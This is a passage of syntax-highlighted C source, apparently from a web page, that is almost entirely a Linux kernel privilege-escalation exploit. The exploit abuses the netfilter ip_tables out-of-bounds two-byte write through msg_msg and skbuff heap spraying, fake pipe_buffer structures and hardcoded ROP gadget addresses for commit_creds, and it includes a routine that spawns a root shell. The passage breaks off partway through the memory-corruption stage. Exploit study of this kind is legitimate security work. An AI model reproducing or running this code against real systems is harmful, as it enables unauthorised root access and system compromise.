class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//compile exp: $ gcc -m32 -static -masm=intel -o exploit exploit.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netfilter_ipv4/ip_tables.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// clang-format on</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PRIMARY_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SECONDARY_SIZE 0x400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_SOCKETS 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_SKBUFFS 128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_PIPEFDS 256</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_MSQIDS 4096</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HOLE_STEP 1024</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MTYPE_PRIMARY 0x41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MTYPE_SECONDARY 0x42</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MTYPE_FAKE 0x1337</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_TAG 0xAAAAAAAA</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Gadget </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PUSH_RSI_JMP_RSI_0x2E 0xffffffff81b4e244</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_RSP_0x98_RET 0xffffffff81a7895e</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RSP_RET 0xffffffff81900644</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POP_RDI_RET 0xffffffff81001629</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff8244c8a0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff8108e690</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00df0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff82019340</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//pt_regs</span></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_eflags;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// clang-format on</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SKB_SHARED_INFO_SIZE 0x140</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_MSG_SIZE (sizeof(struct msg_msg))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MSG_MSGSEG_SIZE (sizeof(struct msg_msgseg))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//some struct</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint64_t</span> m_list_next;</span><br><span class="line">  <span class="keyword">uint64_t</span> m_list_prev;</span><br><span class="line">  <span class="keyword">uint64_t</span> m_type;</span><br><span class="line">  <span class="keyword">uint64_t</span> m_ts;</span><br><span class="line">  <span class="keyword">uint64_t</span> next;</span><br><span class="line">  <span class="keyword">uint64_t</span> security;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint64_t</span> next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint64_t</span> page;</span><br><span class="line">  <span class="keyword">uint32_t</span> offset;</span><br><span class="line">  <span class="keyword">uint32_t</span> len;</span><br><span class="line">  <span class="keyword">uint64_t</span> ops;</span><br><span class="line">  <span class="keyword">uint32_t</span> flags;</span><br><span class="line">  <span class="keyword">uint32_t</span> pad;</span><br><span class="line">  <span class="keyword">uint64_t</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint64_t</span> confirm;</span><br><span class="line">  <span class="keyword">uint64_t</span> release;</span><br><span class="line">  <span class="keyword">uint64_t</span> steal;</span><br><span class="line">  <span class="keyword">uint64_t</span> get;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">long</span> mtype;</span><br><span class="line">  <span class="keyword">char</span> mtext[PRIMARY_SIZE - MSG_MSG_SIZE];</span><br><span class="line">&#125; msg_primary;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">long</span> mtype;</span><br><span class="line">  <span class="keyword">char</span> mtext[SECONDARY_SIZE - MSG_MSG_SIZE];</span><br><span class="line">&#125; msg_secondary;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">long</span> mtype;</span><br><span class="line">  <span class="keyword">char</span> mtext[PAGE_SIZE - MSG_MSG_SIZE + PAGE_SIZE - MSG_MSGSEG_SIZE];</span><br><span class="line">&#125; msg_fake;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build_msg_msg</span><span class="params">(struct msg_msg *msg, <span class="keyword">uint64_t</span> m_list_next,</span></span></span><br><span class="line"><span class="params"><span class="function">                   <span class="keyword">uint64_t</span> m_list_prev, <span class="keyword">uint64_t</span> m_ts, <span class="keyword">uint64_t</span> next)</span> </span>&#123;</span><br><span class="line">  msg-&gt;m_list_next = m_list_next;</span><br><span class="line">  msg-&gt;m_list_prev = m_list_prev;</span><br><span class="line">  msg-&gt;m_type = MTYPE_FAKE;</span><br><span class="line">  msg-&gt;m_ts = m_ts;</span><br><span class="line">  msg-&gt;next = next;</span><br><span class="line">  msg-&gt;security = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getRootShell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;failed to gain the root!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege, trigerring root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, esp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_eflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">write_msg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">const</span> <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span> </span>&#123;</span><br><span class="line">  *(<span class="keyword">long</span> *)msgp = msgtyp;</span><br><span class="line">  <span class="keyword">if</span> (msgsnd(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] msgsnd&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">peek_msg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), msgtyp, MSG_COPY | IPC_NOWAIT) &lt;</span><br><span class="line">      <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] msgrcv&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_msg</span><span class="params">(<span class="keyword">int</span> msqid, <span class="keyword">void</span> *msgp, <span class="keyword">size_t</span> msgsz, <span class="keyword">long</span> msgtyp)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (msgrcv(msqid, msgp, msgsz - <span class="keyword">sizeof</span>(<span class="keyword">long</span>), msgtyp, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] msgrcv&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spray_skbuff</span><span class="params">(<span class="keyword">int</span> ss[NUM_SOCKETS][<span class="number">2</span>], <span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; NUM_SKBUFFS; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (write(ss[i][<span class="number">0</span>], buf, size) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] write&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">free_skbuff</span><span class="params">(<span class="keyword">int</span> ss[NUM_SOCKETS][<span class="number">2</span>], <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; NUM_SKBUFFS; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (read(ss[i][<span class="number">1</span>], buf, size) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] read&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">trigger_oob_write</span><span class="params">(<span class="keyword">int</span> s)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> __<span class="title">attribute__</span>((__<span class="title">packed__</span>)) &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipt_replace</span> <span class="title">replace</span>;</span>                     <span class="comment">// 0x60</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipt_entry</span> <span class="title">entry</span>;</span>                         <span class="comment">// 0x70</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_match</span> <span class="title">match</span>;</span>                    <span class="comment">// 0x20</span></span><br><span class="line">    <span class="keyword">char</span> pad[<span class="number">0x108</span> + PRIMARY_SIZE - <span class="number">0x200</span> - <span class="number">0x2</span>];   <span class="comment">//  kvmalloc_size = sizeof(xt_table_info) + ipt_replace-&gt;size =  0x40 + (0xFB8 - 0x2) = 0xFF8 - 0x2</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_target</span> <span class="title">target</span>;</span>                  <span class="comment">// 0x20</span></span><br><span class="line">  &#125; data = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  data.replace.num_counters = <span class="number">1</span>;</span><br><span class="line">  data.replace.num_entries = <span class="number">1</span>;</span><br><span class="line">  data.replace.size = (<span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match) +</span><br><span class="line">                       <span class="keyword">sizeof</span>(data.pad) + <span class="keyword">sizeof</span>(data.target));             <span class="comment">// 0x70 + (0x108+0x1000-0x200-0x2) + 0x20 + 0x20 = 0xFB8 - 0x2</span></span><br><span class="line"></span><br><span class="line">  data.entry.next_offset = (<span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match) +</span><br><span class="line">                            <span class="keyword">sizeof</span>(data.pad) + <span class="keyword">sizeof</span>(data.target));        <span class="comment">// Size of ipt_entry + matches + target</span></span><br><span class="line">  data.entry.target_offset =</span><br><span class="line">      (<span class="keyword">sizeof</span>(data.entry) + <span class="keyword">sizeof</span>(data.match) + <span class="keyword">sizeof</span>(data.pad));         <span class="comment">// Size of ipt_entry + matches</span></span><br><span class="line"></span><br><span class="line">  data.match.u.user.match_size = (<span class="keyword">sizeof</span>(data.match) + <span class="keyword">sizeof</span>(data.pad));   <span class="comment">// 0x20 + (0x108+0x1000-0x200-0x2) = 0xF28 - 0x2</span></span><br><span class="line">  <span class="built_in">strcpy</span>(data.match.u.user.name, <span class="string">&quot;icmp&quot;</span>);</span><br><span class="line">  data.match.u.user.revision = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  data.target.u.user.target_size = <span class="keyword">sizeof</span>(data.target);                     <span class="comment">// 0x20</span></span><br><span class="line">  <span class="built_in">strcpy</span>(data.target.u.user.name, <span class="string">&quot;NFQUEUE&quot;</span>);</span><br><span class="line">  data.target.u.user.revision = <span class="number">1</span>;</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Partially overwrite the adjacent buffer with 2 bytes of zero.</span></span><br><span class="line">  <span class="keyword">if</span> (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, &amp;data, <span class="keyword">sizeof</span>(data)) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (errno == ENOPROTOOPT) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] Error ip_tables module is not loaded.\n&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setup_sandbox</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (unshare(CLONE_NEWUSER) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] unshare(CLONE_NEWUSER)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (unshare(CLONE_NEWNET) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] unshare(CLONE_NEWNET)&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//bind the cpu0</span></span><br><span class="line">  <span class="keyword">cpu_set_t</span> <span class="built_in">set</span>;</span><br><span class="line">  CPU_ZERO(&amp;<span class="built_in">set</span>);</span><br><span class="line">  CPU_SET(<span class="number">0</span>, &amp;<span class="built_in">set</span>);</span><br><span class="line">  <span class="keyword">if</span> (sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(<span class="built_in">set</span>), &amp;<span class="built_in">set</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] sched_setaffinity&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> s;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">int</span> ss[NUM_SOCKETS][<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">int</span> pipefd[NUM_PIPEFDS][<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">int</span> msqid[NUM_MSQIDS];</span><br><span class="line">  <span class="keyword">uint64_t</span>    *rop_chain;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span> primary_buf[PRIMARY_SIZE - SKB_SHARED_INFO_SIZE];</span><br><span class="line">  <span class="keyword">char</span> secondary_buf[SECONDARY_SIZE - SKB_SHARED_INFO_SIZE];</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">fake_pipe_buffer_ops</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">fake_pipe_buffer</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint64_t</span> pipe_buffer_ops = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">uint64_t</span> kheap_addr = <span class="number">0</span>, kbase_addr = <span class="number">0</span>, kernel_offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> fake_idx = <span class="number">-1</span>, real_idx = <span class="number">-1</span>;</span><br><span class="line">  saveStatus();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] STAGE 0: Initialization\033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Setting up namespace sandbox...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (setup_sandbox() &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Initializing sockets and message queues...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] socket&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, ss[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] socketpair&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 1. two bytes null write -&gt; UAF</span></span><br><span class="line"><span class="comment">// 1-1. gain 4096 msg queue</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | <span class="number">0666</span>)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] msgget&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] STAGE 1: Memory corruption\033[0m\n&quot;</span>);</span><br><span class="line"><span class="comment">//1-2. create 4096 primary msg â€”â€” size=0x1000</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying primary messages...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;msg_primary, <span class="string">&#x27;\xdd&#x27;</span>, <span class="number">0x100</span>);</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;msg_primary.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;msg_primary.mtext[<span class="number">4</span>] = i;</span><br><span class="line">    <span class="keyword">if</span> (write_msg(msqid[i], &amp;msg_primary, <span class="keyword">sizeof</span>(msg_primary), MTYPE_PRIMARY) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 1-3. create 4096 secondary msg â€”â€” size=0x400</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying secondary messages...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;msg_secondary, <span class="number">0</span>, <span class="keyword">sizeof</span>(msg_secondary));</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;msg_secondary.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;msg_secondary.mtext[<span class="number">4</span>] = i;</span><br><span class="line">    <span class="keyword">if</span> (write_msg(msqid[i], &amp;msg_secondary, <span class="keyword">sizeof</span>(msg_secondary),</span><br><span class="line">                  MTYPE_SECONDARY) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 1-4. release #1024/#2048/#3072 msg</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Creating holes in primary messages...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = HOLE_STEP; i &lt; NUM_MSQIDS; i += HOLE_STEP) &#123;</span><br><span class="line">    <span class="keyword">if</span> (read_msg(msqid[i], &amp;msg_primary, <span class="keyword">sizeof</span>(msg_primary), MTYPE_PRIMARY) &lt;</span><br><span class="line">        <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 1-5. make xt_table_info struct take up the hole, and triger 2 bytes null write</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Triggering out-of-bounds write...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (trigger_oob_write(s) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1-6. find which msg is corrupted</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Searching for corrupted primary message...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i != <span class="number">0</span> &amp;&amp; (i % HOLE_STEP) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (peek_msg(msqid[i], &amp;msg_secondary, <span class="keyword">sizeof</span>(msg_secondary), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;msg_secondary.mtext[<span class="number">0</span>] != MSG_TAG) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[-] Error could not corrupt any primary message.\n&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_no_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;msg_secondary.mtext[<span class="number">4</span>] != i) &#123;</span><br><span class="line">      fake_idx = i;</span><br><span class="line">      real_idx = *(<span class="keyword">int</span> *)&amp;msg_secondary.mtext[<span class="number">4</span>];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fake_idx == <span class="number">-1</span> &amp;&amp; real_idx == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error could not corrupt any primary message.\n&quot;</span>);</span><br><span class="line">    <span 